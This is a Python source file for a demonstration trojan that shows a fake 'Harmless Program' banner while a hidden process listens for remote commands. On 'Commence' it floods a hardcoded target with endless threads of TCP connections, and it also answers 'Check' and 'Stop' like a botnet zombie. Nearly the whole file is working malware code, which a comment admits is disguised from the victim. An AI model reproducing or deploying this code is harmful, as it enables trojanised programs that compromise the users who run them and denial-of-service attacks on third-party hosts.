# This program runs a normal looking program in front and tries to connect to attacker at back. 
# Therefore the "harmless" and "secret" parts.

import threading
from multiprocessing import Process
import time
import string
import socket 
import random 

# Edit these values
# SRC = victim
# TARGET = attacker, yeah I interchanged them somehow my bad

SRC_IP = "192.168.1.5" 
SRC_PORT = 7777
TARGET_IP = "192.168.1.7"
TARGET_PORT = 4000 

count = 0

class multithread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            s.connect((TARGET_IP, TARGET_PORT))
        except:
            print("Exception occured, timeout...") # This message is not needed, this is displayed on screen of victim just for demonstration.
            
# You can use something like calculator program here or something even better
def normal():
    print("\n")
    print("#"*12+" Welcome to Harmless Program "+"#"*12)
    print('\n')
    print("This is talkative program and will keep printing random text unless stopped with Ctrl+C...")
    while True:
        ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)) 
        print("Do you know what is "+ran+"????")
        print("Sleeping for 3 seconds am tired...")
        time.sleep(3)     

def attack():
    count = 0
    while 1:
        # Create new threads
        multithread(count, "Thread-{}".format(count), count).start()
        count = count+1
        # print("Attacked!")

def secret():
    HOST = SRC_IP
    PORT = SRC_PORT
    flag = 1
    
    while flag==1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                while flag ==1:
                    data = conn.recv(1024)
                    if not data:
                        break
                    elif "Stop" in repr(data):
                        conn.sendall('Closing the connection...'.encode('utf-8'))
                        conn.close()
                        flag = 0
                    elif "Commence" in repr(data):
                        attack()
                    elif "Check" in repr(data):
                        conn.sendall('The Zombie is Up and listening...'.encode('utf-8'))
                    else:
                        pass
        s.close()

if __name__=='__main__':     
    p1 = Process(target = normal)
    p1.start()
    p2 = Process(target = secret)
    p2.start()
